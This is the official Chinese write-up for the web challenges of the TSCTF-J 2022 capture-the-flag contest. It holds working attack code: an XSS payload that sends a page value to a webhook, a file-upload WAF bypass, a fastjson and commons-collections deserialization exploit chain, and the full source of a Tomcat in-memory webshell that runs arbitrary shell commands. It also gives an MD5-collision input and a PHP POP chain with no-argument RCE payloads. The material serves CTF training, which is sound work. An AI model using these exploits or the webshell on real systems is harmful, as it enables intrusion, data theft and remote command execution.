# TSCTF-J2022 官方WP
[TOC]

## WEB
web 出题文档的一张图。。不作评价
![](https://md.byr.moe/uploads/upload_5f24e6c7d97757b593d303e72be9ec75.png)




web 方向可以先参考 mix 大爹的 [WP](https://frank-allen.notion.site/TSCTF-J-2022-Writeup-0acdd3d5c00b45988a30543758db2f7a) 

这是我这辈子看过写的最精彩的 wp orz..

### 词超人

帮助大家美美过四六级（bushi

![](https://md.byr.moe/uploads/upload_1f866ece1f7c0e312ad4c1dcb9033141.png)

一共1000个单词，填对所有单词返回flag

#### 预期解: 手填1000个单词
人间正道是沧桑
![](https://md.byr.moe/uploads/upload_7c114ef937f8d82583f22531916fc59e.jpg)
#### 非预期解

好了好了，说正事（

本题灵感来源于针对刷课/刷题网站的脚本。

一些不好好学英语的坏孩子提供了一些歪点子：
1. 浏览器控制台执行js脚本填入所有单词
2. 写python爬虫脚本发包
3. 字符串处理

可以抓包看看前端发过去了什么东西

![](https://md.byr.moe/uploads/upload_b0e679c7f8600cab598dd63a1bbcce58.png)

是一个id和answer组成的json数组。而仔细观察前端html源码会发现，每一个单词的id和answer都给了

![](https://md.byr.moe/uploads/upload_b811009d728fdb639ff6c282ae9b5542.png)

##### 思路1

观察submit函数的这一部分
```javascript=
const answerArray=[];
let divArray=document.getElementsByClassName('chunk')
for(div of divArray){
    answerArray.push({id:div.id,answer:div.getElementsByTagName('input')[0].value})
}
```
answerArray就是最终发的数据。我们可以改其push的answer字段，让它是需要提交的英文答案。

`answerArray.push({id:div.id,answer:div.getElementsByClassName('en')
[0].innerHTML})`

这里可能涉及到了利用javascript对dom元素操作的知识。不熟悉的同学可以看看w3的文档

https://www.w3schools.com/js/js_htmldom_elements.asp

然后把修改后的submit函数复制到浏览器控制台里

![](https://md.byr.moe/uploads/upload_bbd4734177ee9308578c59bdda354672.png)

点击提交

![](https://md.byr.moe/uploads/upload_2753730b26ef37426de54f47eba44ed3.png)


另外，也可以直接在控制台写脚本把所有词都填上

getby方法
```javascript=
const divArray=document.getElementsByClassName('chunk')
for(div of divArray){
    const en=div.getElementsByClassName('en')[0].innerHTML
    div.getElementsByTagName('input')[0].value=en
}
```
或者用querySeletor一行搞定
```javascript=
[...document.querySelectorAll(".chunk")].forEach(
  (c) =>
    (c.querySelector("input").value = c.querySelector(".en").innerHTML.trim())
);
```

##### 思路2

熟悉正则表达式的同学大可以写一个python爬虫，构造出所有答案正确的json后提交

```python=
import requests
import re
url='http://49.232.201.163:46128'
text=requests.get(url).text
idArray=re.findall(r'<div id="(.+)" class="chunk" style=" width: 30%;margin: 25px auto;text-align: left;">',text)
enArray=re.findall(r'<p class="en" style="visibility:hidden;display: inline">(.+)</p>',text)
answerArray=[]
for i in range(len(idArray)):
    answerArray.append({'id':idArray[i],'answer':enArray[i]})
print(requests.post(url+'/submit',json=answerArray).text)
```

或者使用python爬虫常用的beautifulsoup

```python=
import requests
from bs4 import BeautifulSoup
url='http://49.232.201.163:46128'
text=requests.get(url).text
soup = BeautifulSoup(text, 'html.parser')
divArray = soup.find_all("div", {"class": "chunk"})
answerArray=[]
for div in divArray:
    answerArray.append({
        'id':div['id'],
        'answer':div.find('p',{'class':'en'}).text
    })
print(requests.post(url+'/submit',json=answerArray).text)

```

##### 思路3
字符串处理，即想办法拼接出一个正确的json，放到burpsuite里直接发包。可以使用word等工具进行字符串的查找和替换。似乎比较麻烦..？所以再此不做赘述。

flag:

`TSCTF-J{naughty_or_diligent–which_type_you_are?^_^}`

#### 补充知识
可能有同学好奇后端是怎么检验答案的，也有同学私聊我想玩一些花活来绕过检验XD

后端是用springboot写的，感兴趣的同学可以看看源码

https://github.com/KingBridgeSS/my_ctf_challenges/tree/main/TSCTF-J%202022

后端把用户传进来的answerArray序列化为字节码，然后计算MD5值。通过比对用户的MD5值是否和正确答案的MD5值是否相等判断所有答案是否正确。

![](https://md.byr.moe/uploads/upload_79e58d4ed21eeef058748728332b19d0.png)


### 你的名字

本题灵感来源于大火的匿名提问箱，挺想知道在提问箱里说骚话的人是谁哈哈。

具体而言，这是一个只需要用浏览器就能做的炒鸡简单xss题，而且怕同学们不熟悉还给了一个readme文档，没想到最后才3解呜呜呜

这里再贴一下文档

>看来你真的很想知道提问者的名字hh
>
>好吧。。。为了知道ta是谁，你不一定需要打穿这台服务器。你可以借助XSS进行钓鱼（真的还有那么好心的出题人把考点直接告诉你吗）
>
>可能同学们并不熟悉CTF中前端题的机制，我这里简单介绍一下。
>
>既然要钓鱼，就必须有人去点击页面。但是你真的忍心让bridge 24小时在电脑前帮你点链接吗 = = 
>
>为了达到模拟受害者的目的，CTF比赛中通常会设置一个xss bot来访问钓鱼界面。以这一题为例：
>
>当你回答好问题后，点击`让TA看看我的回答！`按钮，题目中的BOT就会以此问题提问者的身份去访问`/myasks`界面（即`我的提问`）查看你的回答。如果该页面存在xss漏洞，就很有可能造成信息泄露。而在本题中，**BOT的用户名就是flag。**你可以尝试自问自答，看看以提问者的视角，自己的用户名会出现在该页面的哪个位置。
>
>至于怎么在该页面执行javascript脚本，制造xss并泄露信息	，这就需要同学们自行发挥咯！
>
>好吧 xD 测题的时候还是被 diss 难度太大555。能造成xss的可控制输入点`username`和`answer`是有过滤的。过滤函数如下
>
>```js
>function checkUserName(username){
>return username.length<=10
>}
>```
>
>
>
>```js
>async function sanitizeAnswer(questions){
>for(q of questions){
>   // 把 < 替换成html实体 &lt;
>   q.answer=q.answer.replace(/</g,'&lt;')
>   // 这是后端的逻辑，并不重要hhh
>   const askee=await usersDB.findOne({'userId':q.askeeId})
>   q.askeeName=askee.username
>}
>}
>```
>
>想想看怎么绕过呢？
>
>最后最后，同学们可能需要用到信息外带（即把flag发送到远程服务器）。这里推荐一个比较稳定的webhook网站。
>
>https://requestbin.com/r
>
>亲测在本题环境中，http协议（把网站给你提供的https链接中的s去掉即可）GET方法可以接收到请求。
>
>
>
>另外如果有条件代理的同学可以使用这个网站，更加稳定
>
>https://webhook.site/
>
>
>
>实在不行，可以google搜索`xss平台`。如果用不了google，可以试试这几个xss平台网站
>
>https://xss8.cc/
>
>https://xssaq.com/
>
>http://xss.hwact.org/index.php?do=login
>
>另外还有一点，为了防止同学们撞车，**建议大家在注册的时候设置复杂的密码**
>
>如果你觉得题目还有任何问题（which几乎肯定会有XD），请务必私聊我 qq: 1244992934
>
>
>
>祝你找到TA !
>
>

那么思路就非常明确，在以bot视角下的`/myasks`页面制造xss，然后把bot的用户名外带出去。

网站是一个匿名提问箱，在主页可以看到他人对你提出的问题，你可以作出回答；在`提问别人`页面可以根据用户id对他人提问题；`我的提问`页面可以看到你对他人的提问；在`查看/更改我的信息`可以查看和修改用户名，用户密码；`重新登陆`不解释；最后，`让TA看看我的回答`页面可以调用bot访问`我的提问`页面。

制造xss的注入点文档已经明确指出了，下面自问自答看看这两个注入点的具体位置。注意，在提问者bot的视角，攻击者的用户名才是可控的。

![](https://md.byr.moe/uploads/upload_3014a1cd8511bf8313f96a9e6a5f356c.png)


对应的html源码位置

![](https://md.byr.moe/uploads/upload_15684ee0abf40d56401eacec06a171ed.png)


别忘了readme里给出的这两个注入点的过滤：用户名长度要小于10，answer不能包含`<`（会被转义）

上网搜一下xss的基本原理，发现基本都是通过img等标签的onXXX属性执行js，或者直接构造script标签写js代码

所以，首先至少需要构造一个标签。但是呢，如果在username处构造，可输入的内容太少；如果在answer注入又无法构造标签的开头。

但是！如果结合两个注入点，在username构造`<`，然后在answer用`>`闭合，就能构造出一个完整的标签！

但是，为了构造一个正确的img标签，还需要让两个注入点中间的部分消失。这里可以通过把中间的部分构造成标签的一个属性的值来做到。然后在img标签构造onerror属性来执行js代码。最后别忘了引号和标签的闭合

Talk is cheap, show me the code:

```
username = <img src='
answer = ' onerror="alert('xss')">
```

![](https://md.byr.moe/uploads/upload_8abd9e44dba97a85f0fa8ff718ee03de.png)

成功执行alert函数！

![](https://md.byr.moe/uploads/upload_b11dddc1ad8e212faec5ec790458cfe8.png)


既然可以执行任意javascript代码，直接在前端发个包，内容带上bot的用户名（即flag）给攻击者服务器即可。服务器可以使用文档里提供的一万个webhook

先看看以bot的视角用户名在哪

![](https://md.byr.moe/uploads/upload_6d00b8d0fc1cbe60d10777b8f9b8e428.png)


![](https://md.byr.moe/uploads/upload_21f0523102b38dc4bc179c96d7d9fe3c.png)

用getby把这段文本选择出来

`document.getElementsByClassName('outer')[0].getElementsByTagName('h1')[0].innerText`

可以在控制台调试一下

![](https://md.byr.moe/uploads/upload_a85503106b0b59d315cfc6616537a56f.png)

或者直接把整个html页面带出去也不是不行。

`document.body.innerHTML`


js发送请求包网上随便搜搜就能找到。比如使用fetch函数。最终构造的username和answer如下

```
username = <img src='
answer = 
' onerror='fetch("https://webhook.site/xxx/?flag="+document.getElementsByClassName("outer")[0].getElementsByTagName("h1")[0].innerText)'>
```

webhook成功收到用户名（即flag）

![](https://md.byr.moe/uploads/upload_a519e3490600f7e9d479fb1327aaff9e.png)

flag: `TSCTF-J{Hope_we_meet_the_ones}`

(饱含对各位的真挚祝愿 = =)

#### 补充

同样，感兴趣的同学可以研究一下题目源码。（其实这题写着写着就成了一个小项目了XD）

技术栈是 mdb.js前端+node后端+mongoDB数据库+puppeteer+chrome headless

https://github.com/KingBridgeSS/my_ctf_challenges/tree/main/TSCTF-J%202022


比赛过程中，有同学试图通过偷bot的cookie来登录bot账号，这不失为一种好思路。但是为了防止同学们登录之后干坏事，我给bot设置了http only

![](https://md.byr.moe/uploads/upload_32b03a606b7e30892e03ad9af7d2a660.png)

这样就没有办法通过javascript获取cookie。

另外，可能有同学好奇xss产生的原因。后端使用ejs进行模板渲染。在源码的`myask.ejs`文件中，发现`askeeName`和`answer`字段都是用`<%- xxx %>`渲染的。

![](https://md.byr.moe/uploads/upload_2e7f682dae04daab10b83e46fd1d5ffb.png)


查看ejs [官方文档](https://ejs.co/) ，发现这个标签对内容没有任何过滤。由此造成xss。

![](https://md.byr.moe/uploads/upload_e362cb5ae1c747f8c08ee52093547acc.png)

### ezja

学长给国赛决赛出的逆天题目orz...这里简单写一下bridge当时测题的历程，就当激发同学们学习java安全的兴趣（

扫描网站目录发现

`http://123.57.193.197:8082/robots.txt`

内容：

`User-agent: * Disallow: /getSourceHere`

抓包试了试，脑电波对上了，应该是要传一个名为文件名是否为`giveMeSource`的文件名，上传成功就给你源码。但是后端会检测文件名是否包含`giveMeSource`，是的话就被拦截。

搜了下发现这篇文章

[探寻 Java 文件上传流量层面 waf 绕过](https://paper.seebug.org/1930/)

于是构造出这样一个报文（不要在意文件的内容）

```
POST /getSourceHere HTTP/1.1
Host: 123.57.193.197:8082
Content-Length: 272
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://123.57.193.197:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjoDmGrdoPcndzeWk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://123.57.193.197:8082/getSourceHere
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7
Connection: close

------WebKitFormBoundaryjoDmGrdoPcndzeWk
Content-Disposition: form-data; name="file"; filename="UTF-8'foo'11";filename*="1.txt";filename*="%67%69%76%65%4d%65%53%6f%75%72%63%65";

copy test1.png/b+shell.phtml/a png_shell.png
------WebKitFormBoundaryjoDmGrdoPcndzeWk--

```

发包后就可以下载源码。

然后想吐槽一下nama的水管服务器...我中间去洗了个衣服，回来还是没下完hh

把jar包下下来，用jd-gui反编译。会发现这是一个springboot应用

POM包有`commons-collections4`依赖，待会可能可以打cc2链

![](https://md.byr.moe/uploads/upload_4e949e36a30df27036c7e996b391a8de.png)


其中`SerialController`有两个反序列化点

![](https://md.byr.moe/uploads/upload_d0b8607e72f1c951ca8494b1eac3f4ce.png)



第一个是fastjson，查看pom包发现是最新版本，没有什么公开的POC可以打，但是记得其可以触发java bean的任意getter setter方法。另一个是java原生反序列化点，但是限制了500字节。按常规的cc4链不可能打得通。

找啊找，发现题目自己写了一个很有意思的类

`com.ciscn.util.SKTest.SerialKillerTest`

其`getSerialBytes`可以进行没有长度限制的反序列化。结合fastjson可以进到这一个地方打一个二次反序列化。

![](https://md.byr.moe/uploads/upload_be1181d6b853b82b2a7bea257ea58c57.png)


但是会发现有基类黑名单

![](https://md.byr.moe/uploads/upload_763a514bd9434a94c23682b3a77b50c4.png)


最骚的是还是类似fastjson高版本的哈希黑名单，所以按预期解还需要fuzz

![](https://md.byr.moe/uploads/upload_714f602122242ab6a09d45dbac190917.jpg)

但是当时没想太多，直接用`RMIConnector.connect()`三次反序列化，结果真就打通了。。估计是脑电波对上了吧哈哈。

另外题目不出网，需要种一个内存马。

所以就是fastjson触发getter+getSerialBytes二次反序列化+cc2链魔改三次反序列化+cc2链配合TemplatesImpl加载字节码+Tomcat内存马。生成json的POC如下

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.ciscn.util.Person;
import com.ciscn.util.SKTest;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.util.Base64;
import java.util.HashMap;
import java.util.PriorityQueue;

public class Test {
    public static void main(String[] args) throws Exception {
//        Person person=new Person(1,"name");
//        SKTest skTest=new SKTest();
//        skTest.setSerialBytes(serialize(person));
//        System.out.println(JSON.toJSONString(skTest));
//        {"serialBytes":"rO0ABXNyABVjb20uY2lzY24udXRpbC5QZXJzb24V2wbKnAOSiAIAAkkAAmlkTAAEbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwAAAAAXQABG5hbWU="}



        byte[] expBytes=serialize(getPriorityQueueExp());
        String exp= Base64.getEncoder().encodeToString(expBytes);
        RMIConnector rmiConnector=new RMIConnector(
                new JMXServiceURL("service:jmx:rmi://localhost:12345/stub/"+exp),
                new HashMap<String,Integer>()
        );
        InvokerTransformer invokerTransformer=new InvokerTransformer("connect",null,null);
        //invokerTransformer.transform(rmiConnector)
        TransformingComparator comparator=new TransformingComparator(invokerTransformer);
        PriorityQueue queue=new PriorityQueue();
        //让size=2
        queue.add(3);
        queue.add(4);
//        反射，强行往queue塞rmiConnector
        Class queueClass=queue.getClass();
        Field queueField=queueClass.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(queue,new Object[]{rmiConnector,1});

        //反射强写comparator
        Class clazz=queue.getClass();
        Field comparatorField=clazz.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(queue, comparator);
        byte[] b=serialize(queue);
        String base=Base64.getEncoder().encodeToString(b);
//        System.out.println(base);

        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String str="{\n" +
                "  \"@type\": \"com.ciscn.SerialKillerTest\",\n" +
                "  \"serialBytes\":\""+base+"\"}    ";
        System.out.println(str);
//        JSON.parseObject(str);


    }
    static PriorityQueue getPriorityQueueExp() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] {
                ClassPool.getDefault().get(memoryshell.InjectTomcat01.class.getName()).toBytecode()});
        setFieldValue(templates, "_name", "EvilTemplatesImpl"); setFieldValue(templates,
                "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        //制作transformer
        InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        //接下来只需调用transformer.transform(templatesImpl)
//        transformer.transform()
        TransformingComparator comparator=new TransformingComparator(transformer);
        PriorityQueue queue=new PriorityQueue();
        //让size=2
        queue.add(3);
        queue.add(4);
//        反射，强行往queue塞templatesImpl
        Class queueClass=queue.getClass();
        Field queueField=queueClass.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(queue,new Object[]{templates,1});

        //反射强写comparator
        Class clazz=queue.getClass();
        Field comparatorField=clazz.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(queue, comparator);
        return queue;
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws
            Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void deserialize(byte[] bytes) {
        try {
            ByteArrayInputStream ais = new ByteArrayInputStream(bytes);
            ObjectInputStream ois = new ObjectInputStream(ais);
            ois.readObject();
            ois.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static byte[] serialize(Object o) {
        try {
            ByteArrayOutputStream aos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(aos);
            oos.writeObject(o);
            oos.flush();
            oos.close();
            return aos.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}

```

内存马

```java 
/*
目前测试springboot可用的内存马
 */
package memoryshell;

import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.Map;

public class InjectTomcat01 extends AbstractTranslet implements Filter{

    private static String filterName = "k";
    private static String param = "bridge_is_noob";
    private static String filterUrlPattern = "/*";
    static {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            ServletContext servletContext = standardContext.getServletContext();
            Field filterConfigs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            filterConfigs.setAccessible(true);
            Map map = (Map) filterConfigs.get(standardContext);
            if (map.get(filterName) == null && standardContext != null){
                Field stateField = Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                FilterRegistration.Dynamic filter = servletContext.addFilter(filterName, new InjectTomcat01());
                filter.addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST),false,new String[]{filterUrlPattern});
                Method filterStart = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("filterStart");
                filterStart.invoke(standardContext,null);
                FilterMap[] filterMaps = standardContext.findFilterMaps();
                for (int i = 0 ; i < filterMaps.length ; i++){
                    if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)){
                        FilterMap filterMap = filterMaps[0];
                        filterMaps[0] = filterMaps[i];
                        filterMaps[i] = filterMap;
                    }
                }
                stateField.set(standardContext,LifecycleState.STARTED);
            }
        }catch (Exception e){}
    }


    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String string = servletRequest.getParameter(param);
        if (string != null){
            String osName = System.getProperty("os.name");
            String[] cmd = osName != null && osName.toLowerCase().contains("win") ? new String[]{"cmd.exe","/c",string} : new String[]{"/bin/bash","-c",string};
            Process exec = Runtime.getRuntime().exec(cmd);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()));
            StringBuffer stringBuffer = new StringBuffer();
            String lineData;
            while ((lineData = bufferedReader.readLine()) != null){
                stringBuffer.append(lineData + '\n');
            }
            servletResponse.getOutputStream().write(stringBuffer.toString().getBytes(StandardCharsets.UTF_8));
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }
}
```


种上内存马后，发现根目录下flag需要root权限，但是提供了一个readflag。这里预期解是base64 dump程序进行逆向，然后会发现是个pwn

关键函数在这里，允许任意读取文件，但是过滤了flag字符串

```c
bool __cdecl checkfunc(char *n)
{
  return !strstr(n, "flag") && strstr(n, "..") == 0LL;
}
```

注意到这里允许无限次输入文件名称，同时存储字符串的的变量没有清空，也就是说上一次输入的字符会残留在其中。同时读入函数不会存储回车符号。

写一个c语言程序用于交互

```c 
// gcc -o exp exp.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
char buf[0x1000];
char expstr[0x50];
static int start_subprocess(char *command[], int *pid, int *infd, int *outfd){
    int p1[2], p2[2];
    if (!pid || !infd || !outfd)
        return 0;

    if (pipe(p1) == -1)
        return 0;
    if (pipe(p2) == -1){
        close(p1[1]);
        close(p1[0]);
        return 0;
    }
    if ((*pid = fork()) == -1){
        close(p2[1]);
        close(p2[0]);
        return 0;
    }
    if (*pid)
    {
        *infd = p1[1];
        *outfd = p2[0];
        close(p1[0]);
        close(p2[1]);
        return 1;
    }
    else
    {
        dup2(p1[0], 0);
        dup2(p2[1], 1);
        close(p1[0]);
        close(p1[1]);
        close(p2[0]);
        close(p2[1]);
        execvp(*command, command);
        /* Error occured. */
        fprintf(stderr, "error running %s: %s", *command, strerror(errno));
        abort();
    }
}

void solve(char* buf){
    int pid, infd, outfd;
    char *cmd[2];
    cmd[0] = "./readflag";
    cmd[1] = 0;
    start_subprocess(cmd, &pid, &outfd, &infd);
    memset(buf,0,sizeof(buf));
    memset(expstr,0,sizeof(expstr));
    read(infd, buf, strlen("Input the file U want to read: "));
    printf("%s\n", buf);
    sprintf(expstr, "%s", "aaaag\n");
    write(outfd, expstr, strlen(expstr));

    memset(expstr,0,sizeof(expstr));
    memset(buf,0,sizeof(buf));
    read(infd, buf, strlen("Not that file\nInput the file U want to read: "));
    printf("%s\n", buf);
    sprintf(expstr, "%s", "/fla\n");
    write(outfd, expstr, strlen(expstr));
    read(infd, buf, strlen("Input the file U want to read: "));
    printf("%s\n", buf);
    memset(buf,0,sizeof(buf));
    read(infd, buf, 1000);
}
int main(){
    solve(buf);
    return 0;
}
```

但是但是，我当时直接bash管道符把flag输入进去就出了

![](https://md.byr.moe/uploads/upload_e09e564180ebbd87b8b3abe28ea18c0e.png)

emm估计是循环导致的bug?

![](https://md.byr.moe/uploads/upload_7f817e878b6a3a1ccd18d4b2049dfd3c.jpg)

Anyway，现阶段这道题涉及的知识点可能对同学们来说有点多，希望这篇wp可以起到一个激发大家求知欲的作用。

### OnlyIMG
本题考点

- 绕过题目前端上传限制

可以直接修改题目前端的js代码，即可绕过限制，或者可以传一张图片之后抓包进行修改

- 如何绕过后端后缀名限制

不让传php后缀，可以传一个解析文件进行绕过，由回显可知题目的web服务器使用的是apache，可以尝试.htaccess来改变某个目录的解析方式，例如可以上传合法的jpg文件，内容是恶意php代码，再用.htaccess让apache把jpg当成php处理即可绕过

- 如何绕过文件内容过滤

过滤了<?p，这个地方会影响正常的php标签<?php，可以用短标签绕过，<? ?>或<?= ?>(需要php配置文件short_open_tag开启)
为何<script language="php"></script>不行：响应包中可以得到php版本，php7中该标签被删除

- 如何取得上传路径

审计源码
![](https://md.byr.moe/uploads/upload_ab7d8aa247808a4bf708cb6ed3179c8d.png)
预期：
在文件名中使用%s，可以利用格式化字符串带出路径
非预期：
可以在文件中加入特殊字符使拼接的路径非法从而让move_uploaded_file函数报错，报错中可以得到路径

> 思考题：
> 如果文件内容过滤的是<?应该怎么做
> （要面试的同学可以准备一下）


### can can need picture
恭喜TSCTF-J2022圆满结束，这是我学ctf以来第一次出题，遇到了各种各样的问题。第一版是杂糅了诸多考点（无参数RCE，pop链，文件包含等），但限于代码技术，还没有实现就夭折了。第二版与最终版比较类似，只不过我想通过无参RCE获得hint，然后通过curl去获取flag，但权限的设置一直没搞好，这一版也就夭折了。然后就是现在的最终版，感觉效果也还不错，有很多解，也有很多师傅来找我交流，希望给大家带来了比较不错的体验。
![](https://kingofkb.github.io/medias/image/20221018/challenge.png)
![](https://kingofkb.github.io/medias/image/20221018/solved.png)

打开题目，看见url，`/index.php?f=YUhSMGNITTZMeTloY0drdWJYUjVjWGd1WTI0dmRHRndhUzl5WVc1a2IyMHVjR2h3`
发现传参f，f中传的值很明显是`base64`加密的，尝试解密（base64两次）得到`https://api.mtyqx.cn/tapi/random.php`。
尝试随便输入一个值，返回`Warning: file_get_contents(): Filename cannot be empty in /var/www/html/index.php on line 14`，`file_get_contents()`函数是可以用来获取本地文件的。
尝试获取`index.php`，`base64`加密两次，得到`YVc1a1pYZ3VjR2h3`，传入，发现得到提示`no,you can't see this.can can class.php and hack.php.`，尝试读取这两个文件。
class.php
````php
<?php
class apple
{
    public $var;
    public $m1;
    public function __wakeup()
    {
        echo $this->var."1!5!";
    }
    public function __call($name, $args)
    {
        return $this->m1->$source;
    }
}
class banana
{
    public $str;
    public $v1;
    public function __toString()
    {
        $function=$this->str;
        $function();
    }
    public function __invoke()
    {
        return $this->v1->hack();
    }
}
class find
{
    protected $code;
    public function __get($name)
    {
        $this->backdoor();
    }
    public function backdoor()
    {
        if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $this->code)) 
            if(!preg_match('/et|info|dec|bin|hex|oct|pi|log/i',$this->code))
                @eval($this->code);
    }
}
?>
````
hack.php
````php
<?php
include("class.php");
if(is_array($_GET['a']) || is_array($_GET['b']))
    echo("die");
else
{
    if(md5($_GET['a'])===md5($_GET['b']) && $_GET['a']!=$_GET['b'])
        unserialize($_GET['pop']);
    else 
        echo("nonono!");
}
````
很明显是一个pop链，pop链为`apple:__wakeup -> banana:__tostring -> banana:__invoke -> apple:__call -> find:__get -> find:backdoor`。
但首先需要绕过MD5，这个payload网上很好找到，我贴到这
````1
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
````
然后就可以到达backdoor部分，看过滤函数很容易发现这是一道无参数RCE的问题，但是get被ban掉了，想办法绕过，这时候选择localeconv()函数加scandir()函数绕过，我们知道scandir()可以列出当前目录，同时，localeconv()的第一位必定是，利用current取出，构造`var_dump(scandir(current(localeconv())))`，可以看到当前目录下有四个文件，其中有一个是`hint.php`，想办法读取。构造`show_source(next(array_reverse(scandir(current(localeconv())))));`即可看到hint.php代码，里面告诉我们flag在根目录。
![](https://kingofkb.github.io/medias/image/20221018/hint.png)
接下来就是想办法构造/，网上有很多现成payload，我参考的就是这个[php无参数函数实现rce,无参数读文件和RCE总结](https://blog.csdn.net/weixin_28759987/article/details/116284686)，最后的payload为`show_source(current(array_reverse(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));`，这个结果输出有三种可能，要多尝试两次，可以得到flag。
我把最后的脚本贴到这
````php
<?php
class apple
{
    public $var;
    public $m1;
}
class banana
{
    public $str;
    public $v1;
}
class find
{
    protected $code="show_source(current(array_reverse(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));";
    //print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
    //show_source(next(array_reverse(scandir(current(localeconv())))));
    //show_source(current(array_reverse(scandir(chr(ord(strrev(crypt(serialize(array())))))))));
}
$f=new find();
$a1=new apple();
$a2=new apple();
$b1=new banana();
$b2=new banana();

$a2->m1=$f;
$b2->v1=$a2;
$b1->str=$b2;
$a1->var=$b1;

echo urlencode(serialize($a1));
?>
````
````python
import requests

url="http://8.141.150.150:11233/hack.php"

a="M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2";
b="M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2";
r1=requests.get(url="http://localhost/ezphp/exp3.php")
pop=str(r1.text)
r=requests.get(url=url+"?a="+a+"&b="+b+"&pop="+pop)
print(url+"?a="+a+"&b="+b+"&pop="+pop)
print(r.text)
````
得到flag
![](https://kingofkb.github.io/medias/image/20221018/flag.png)

### UrlShorten

其实最开始出题就只有后面的 sql 考点，打算加点黑名单之类的，不过这么出感觉没啥意思，所以换成在 sql 注入之前加了代码审计 + 善用搜索引擎。

